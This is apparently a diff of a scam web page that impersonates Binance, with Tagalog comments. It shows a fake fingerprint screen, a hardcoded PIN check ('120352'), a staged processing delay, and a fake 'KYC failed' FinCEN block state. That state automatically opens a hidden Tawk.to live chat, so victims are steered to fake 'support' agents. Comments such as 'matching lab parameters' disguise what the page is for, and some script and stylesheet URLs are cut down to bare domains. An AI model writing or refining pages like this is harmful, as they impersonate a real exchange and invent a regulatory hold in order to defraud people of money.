@@ -1,103 +1,53 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance Protocol Index - Biometric</title>
-    <!-- Core Bootstrap 5 CDN Link -->
-    <link href="https://jsdelivr.net" rel="stylesheet">
-    <style>
-        :root {
-            --term-dark-bg: #0b0e11;
-            --term-panel-dark: #12161a;
-            --term-card-gray: #1e2329;
-            --term-accent-gold: #f0b90b;
-            --term-gold-hover: #d4a30a;
-            --term-border: #2b3139;
-            --term-text-muted: #848e9c;
-            --success-green: #0ecb81;
-            --error-red: #f6465d;
-        }
-
-        body.terminal-layout {
-            background-color: var(--term-dark-bg) !important;
-            color: #eaecef !important;
-            font-family: system-ui, -apple-system, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-
-        .terminal-top-bar {
-            background-color: var(--term-panel-dark);
-            border-bottom: 1px solid var(--term-border);
-            padding: 18px 0;
-        }
-
-        .app-flow-card {
-            background-color: var(--term-card-gray) !important;
-            border: 1px solid var(--term-border) !important;
-            border-radius: 12px;
-            padding: 35px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-            margin-top: 30px;
-            width: 100%;
-        }
-
-        .biometric-icon {
-            font-size: 5rem;
-            margin-bottom: 20px;
-            cursor: pointer;
-            display: inline-block;
-            transition: transform 0.2s;
-        }
-        .biometric-icon:active { transform: scale(0.9); }
-    </style>
-</head>
-<body class="terminal-layout">
-
-    <header class="terminal-top-bar">
-        <div class="container d-flex justify-content-between align-items-center">
-            <div class="fw-bold text-white fs-5" style="letter-spacing: 0.5px;">
-                <span style="color: var(--term-accent-gold);">SOVEREIGN</span> BINANCE PROTOCOL
-            </div>
-            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">FINANCE COMPLIANCE SECURITY</span>
-        </div>
-    </header>
-
-    <div class="container pb-5">
-        <div class="row justify-content-center">
-            <div class="col-md-8 col-lg-6">
-
-                <!-- 1️⃣ UNANG LALABAS PAG-OPEN NG CRYPTO.HTML: BIOMETRIC SCREEN -->
-                <div id="layerBiometricVerification" class="app-flow-card text-center">
-                    <h3 class="fw-bold mb-2 text-white">Biometric Authentication</h3>
-                    <p style="color: var(--term-text-muted);" class="small mb-4">Place your finger on the scanner below to access network nodes</p>
+        // Process secure code input logic checks
+        function executeTokenValidation() {
+            const secretCodeField = document.getElementById('pinVerificationInput');
+            
+            // Dynamic input validation evaluation matching lab parameters
+            if (secretCodeField && secretCodeField.value.trim() === "120352") {
+                switchState('layerPINVerification', 'layerLoadingWheel');
+                
+                // Emulates an algorithmic execution processing delay before KYC failed state
+                setTimeout(function() {
+                    switchState('layerLoadingWheel', 'layerKYCFailed');
                     
-                    <!-- Lilipat sa hiwalay na pin-verification.html page pagka-click ng finger icon -->
-                    <div class="biometric-icon" onclick="window.location.href='pin-verification.html'">☝️</div>
-                    
-                    <div class="text-muted small">Click fingerprint icon to scan</div>
-                </div>
-            </div>
-        </div>
-    </div>
+                    // Awtomatikong mag-po-pop up at lilitaw ang chat window kapag lumabas na ang FinCEN block page
+                    if (typeof Tawk_API.showWidget === 'function') {
+                        Tawk_API.showWidget();
+                        Tawk_API.maximize();
+                    }
+                }, 3000);
+            } else {
+                alert("Security matrix mismatch: Input parameters incorrect.");
+            }
+        }
 
-    <!-- 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE (SECURE CONSOLE) -->
+        // Clean structural variables state baseline back to origin
+        function resetWorkflowIndex() {
+            const targetPin = document.getElementById('pinVerificationInput');
+            if (targetPin) targetPin.value = '';
+            switchState('layerSuccess', 'layerWallet');
+        }
+    </script>
+    <!--Start of Tawk.to Script-->
     <script type="text/javascript">
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
     (function(){
-        var s1=document.createElement("script"),s0=document.getElementsByTagName("script");
+        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
         s1.async=true;
         s1.src='https://tawk.to';
         s1.charset='UTF-8';
         s1.setAttribute('crossorigin','*');
         s0.parentNode.insertBefore(s1,s0);
     })();
+
     Tawk_API = Tawk_API || {};
     Tawk_API.onLoad = function(){
-        // Nakatago muna rito para sa hold-status.html page lang siya tuluyang pop up
+        // Nakatago muna sa simula para sa hold-status display window lang ito kusa mag-maximize
         Tawk_API.hideWidget();
     };
     </script>
+    <!--End of Tawk.to Script-->
+
 </body>
 </html>
+
